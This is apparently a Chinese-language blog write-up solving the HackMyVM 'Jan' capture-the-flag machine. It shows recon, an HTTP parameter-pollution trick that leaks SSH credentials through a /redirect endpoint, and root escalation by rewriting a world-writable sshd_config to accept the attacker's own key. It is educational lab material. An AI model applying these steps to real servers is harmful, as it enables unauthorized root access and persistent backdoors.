---
title: HackMyVM-Jan
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Jan.

> https://hackmyvm.eu/machines/machine.php?vm=jan
> 

Notes: **CTF Like. Have fun!**

## 信息收集

`17`是靶机

```python
┌──(root㉿kali)-[~]
└─# nmap -sP 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 06:53 EST
Nmap scan report for 192.168.56.1
Host is up (0.00051s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00039s latency).
MAC Address: 08:00:27:F4:7E:34 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.17
Host is up (0.00043s latency).
MAC Address: 08:00:27:4B:C2:B9 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.16 seconds
```

```python
┌──(root㉿kali)-[~]
└─# nmap -sT -min-rate 10000 -p- 192.168.56.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 06:54 EST
Nmap scan report for 192.168.56.17
Host is up (0.00057s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:4B:C2:B9 (Oracle VirtualBox virtual NIC)
```

```python
┌──(root㉿kali)-[~]
└─# nmap -sT -A -T4 -p 22,8080 192.168.56.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 06:55 EST
Nmap scan report for 192.168.56.17
Host is up (0.00063s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
|_  256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Thu, 06 Feb 2025 11:55:57 GMT
|     Content-Length: 45
|     Content-Type: text/plain; charset=utf-8
|     Welcome to our Public Server. Maybe Internal.
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=2/6%Time=67A4A34F%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2006\x20Feb\x20
SF:2025\x2011:55:57\x20GMT\r\nContent-Length:\x2045\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x20Public\x20Ser
SF:ver\.\x20Maybe\x20Internal\.")%r(HTTPOptions,A2,"HTTP/1\.0\x20200\x20OK
SF:\r\nDate:\x20Thu,\x2006\x20Feb\x202025\x2011:55:57\x20GMT\r\nContent-Le
SF:ngth:\x2045\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWel
SF:come\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(FourOhFourRequest,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu
SF:,\x2006\x20Feb\x202025\x2011:55:57\x20GMT\r\nContent-Length:\x2045\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20ou
SF:r\x20Public\x20Server\.\x20Maybe\x20Internal\.")%r(Socks5,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GenericLin
SF:es,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request");
MAC Address: 08:00:27:4B:C2:B9 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.63 ms 192.168.56.17
```

使用过`nmap`的`script`模块扫描漏洞的时候会卡住，所以就没有这一步骤

优先级：`8080` > `22`

## 8080 端口渗透

访问主页：`Welcome to our Public Server. Maybe Internal.` （欢迎来到我们的公共服务器，也可能是内部服务器）意味深长

![image.png](image%2055.png)

扫描一下目录

```python
┌──(root㉿kali)-[~]
└─# dirsearch -u 192.168.56.17:8080 -x 403 -e php,zip,txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/reports/_192.168.56.17_8080/_25-02-06_07-14-59.txt

Target: http://192.168.56.17:8080/

[07:14:59] Starting: 
[07:14:59] 301 -   57B  - /%2e%2e//google.com  ->  /%252E%252E/google.com   
[07:15:13] 301 -   54B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp     
[07:15:13] 301 -   59B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
[07:15:13] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
[07:15:15] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
[07:15:20] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
[07:15:20] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
[07:15:21] 301 -   62B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
[07:15:24] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
[07:15:38] 400 -   24B  - /redirect                                         
[07:15:39] 200 -   16B  - /robots.txt                                       
                                                                             
Task Completed

```

存在`robots.txt`文件，提示了两个路径

```python
/redirect
/credz
```

分别访问两个路径，首先是`redirect` ，提示需要一个`url`参数

![image.png](image%2056.png)

然后是`credz` ，提示：`Only accessible internally.` （仅供内部访问）

![image.png](image%2057.png)

这里应该是要使用`redirect` 使用`url`参数来指向`credz` ，来尝试一下

但是会发现提示：`Only accessible internally.` 

![image.png](image%2058.png)

最后经过测试发现在`/redirect` 加上`url`参数后就会提示`Only accessible internally.` ，这应该是要有别的做法

然后再尝试一下使用`X-Forwarded-For` ，但是我尝试了一会还是一无所获

![image.png](image%2059.png)

但是这是`CTF`题，所以尝试使用两个`url` 参数

最后通过构造：`/redirect?url=1&url=/credz` 成功获取到信息

![image.png](image%2060.png)

这一看应该是个`ssh` 账户，一开始以为`EazyLOL`是个账户，但是通过密码爆破后无果，最后发现`ssh`是账户，`EazyLOL` 是密码

```python
┌──(root㉿kali)-[~]
└─# ssh ssh@192.168.56.17
ssh@192.168.56.17's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~$ 
```

## UserFlag

进来后就可以在当前目录发现`user.txt`

```python
jan:~$ cat user.txt
HMVSxxxxxxxxxxTHFK
```

## 内网信息收集

 查看`jan`用户`sudo`权限

```python
jan:~$ sudo -l
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User ssh may run the following commands on jan:
    (root) NOPASSWD: /sbin/service sshd restart
```

发现可以在使用`root`权限来执行`/sbin/service sshd restart` ，应该重点是在`ssh`服务上了

## 提权 - ssh 公钥劫持

1. 查看一下`ssh`目录的权限，发现`ssh_config` 和`sshd_config` 拥有修改权限
    
    ```python
    jan:/etc/ssh$ ls -al
    total 580
    drwxr-xr-x    4 root     root          4096 Jan 28 09:02 .
    drwxr-xr-x   32 root     root          4096 Jan 28 10:25 ..
    -rw-r--r--    1 root     root        541716 Dec  3 15:08 moduli
    -rw-rw-rw-    1 root     root          1708 Jan 28 10:30 ssh_config
    drwxr-xr-x    2 root     root          4096 Jan 28 09:02 ssh_config.d
    -rw-------    1 root     root           505 Jan 28 09:01 ssh_host_ecdsa_key
    -rw-r--r--    1 root     root           170 Jan 28 09:01 ssh_host_ecdsa_key.pub
    -rw-------    1 root     root           399 Jan 28 09:01 ssh_host_ed25519_key
    -rw-r--r--    1 root     root            90 Jan 28 09:01 ssh_host_ed25519_key.pub
    -rw-------    1 root     root          2590 Jan 28 09:01 ssh_host_rsa_key
    -rw-r--r--    1 root     root           562 Jan 28 09:01 ssh_host_rsa_key.pub
    -rw-rw-rw-    1 root     root          3355 Jan 28 09:01 sshd_config
    drwxr-xr-x    2 root     root          4096 Jan 28 09:02 sshd_config.d
    ```
    
2. `ssh-keygen -t rsa` 是用来生成 RSA 类型的 SSH 密钥对的命令。执行这个命令会生成一个公钥和一个私钥文件，用于 SSH 连接认证
    
    会在家目录生成`.ssh` 文件夹
    
    ```python
    jan:~$ ssh-keygen -t rsa
    Generating public/private rsa key pair.
    Enter file in which to save the key (/home/ssh/.ssh/id_rsa): 
    Created directory '/home/ssh/.ssh'.
    Enter passphrase for "/home/ssh/.ssh/id_rsa" (empty for no passphrase): 
    Enter same passphrase again: 
    Your identification has been saved in /home/ssh/.ssh/id_rsa
    Your public key has been saved in /home/ssh/.ssh/id_rsa.pub
    The key fingerprint is:
    SHA256:4Wrwsmcg6Ixn40sYR7Dm5XNkkrmmvEyyUrhvaYkEfEY ssh@jan
    The key's randomart image is:
    +---[RSA 3072]----+
    |.                |
    | o Eo            |
    |o.o= o  .        |
    |+ooo=  . .       |
    |o++=..  S        |
    |+== +o .         |
    |BB.+..+          |
    |O=X  +o          |
    |oX+o.o           |
    +----[SHA256]-----+
    jan:~$ 
    ```
    
3. 将`id_rsa.pub`名字进行修改，然后将内容的最后的结尾的`ssh`修改为`root`（不会影响加解密但是会将其混淆）
    
    ```python
    jan:~/.ssh$ mv id_rsa.pub attack_keys
    ```
    
    ```python
    9fglITVq2jKR2UXcDNIYyZeMLz5LU7bUdQluDYSU/LmJ2FsaT7KQ1EAnZbsOGrZlz9/U56c8J+58DvCxCpJVhf5yxQITD11DAVlZQpxX+Ws2n72Sp9Myxzm1s9/2DcA4aueVI/zc8gLuN/WpWcWs= root@jan
    ```
    
4. 修改`sshd_config`配置文件
    
    ```python
    PermitRootLogin yes 
    StrictModes no 
    AuthorizedKeysFile      /home/ssh/.ssh/attack_keys
    ```
    
    > 参数解释：
    > 
    > - **PermitRootLogin yes**：允许 `root` 用户通过 SSH 登录。
    > - **StrictModes no**：禁用权限严格检查，避免因权限问题阻止 SSH 登录。
    > - **AuthorizedKeysFile `/home/ssh/.ssh/attack_keys`**：指定使用自定义的公钥文件 `attack_keys`。
5. 修改`ssh_config` ，注释掉`banner`
    
    ```python
    #Banner /etc/shadow
    ```
    
6. 重启服务，并使用密钥文件进行登录，即可获得`root`权限
    
    ```python
    jan:~/.ssh$ sudo /sbin/service sshd restart
     * Stopping sshd ...                                                                                                                                   [ ok ]
     * Starting sshd ...                                                                                                                                   [ ok ]
    jan:~/.ssh$ ssh root@localhost -i id_rsa
    Welcome to Alpine!
    
    The Alpine Wiki contains a large amount of how-to guides and general
    information about administrating Alpine systems.
    See <https://wiki.alpinelinux.org/>.
    
    You can setup the system with the command: setup-alpine
    
    You may change this message by editing /etc/motd.
    
    jan:~# ls
    root.txt  ver.sh
    jan:~# id
    uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
    jan:~# 
    
    ```
    

## RootFlag

```python
jan:~# cat root.txt 
HMV2PRMxxxxxxNGMBG
```